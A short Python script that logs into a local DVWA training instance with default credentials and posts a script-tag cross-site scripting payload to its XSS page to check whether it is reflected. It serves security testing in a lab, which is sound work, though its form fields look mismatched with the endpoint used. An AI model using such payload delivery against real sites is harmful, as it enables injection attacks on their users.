import requests 

from bs4 import BeautifulSoup 

 

# Configuration for DVWA 

url = 'http://localhost:42001/dvwa/login.php' 

username = 'admin' 

password = 'password' 

payload = "<script>alert('XSS')</script>" 

 

# Start a session and log into DVWA 

session = requests.Session() 

login_page = session.get(url) 

login_soup = BeautifulSoup(login_page.text, 'html.parser') 

user_token = login_soup.find('input', {'name': 'user_token'}).get('value') 

 

# Authenticate 

login_data = { 

    'username': username, 

    'password': password, 

    'Login': 'Login', 

    'user_token': user_token 

} 

session.post(url, data=login_data) 

 

# Prepare for XSS testing 

xss_url = 'http://localhost:42001/dvwa/vulnerabilities/xss_r/' 

page = session.get(xss_url) 

soup = BeautifulSoup(page.text, 'html.parser') 

user_token = soup.find('input', {'name': 'user_token'}).get('value') 

 

# Payload delivery 

xss_data = { 

    'name': payload, 

    'user_token': user_token, 

    'btnSign': 'Sign Guestbook' 

} 

result = session.post(xss_url, data=xss_data) 

 

# Check if payload is executed 

if payload in result.text: 

    print("XSS vulnerability found!") 

else: 

    print("No XSS vulnerability found.") 

 

session.close() 
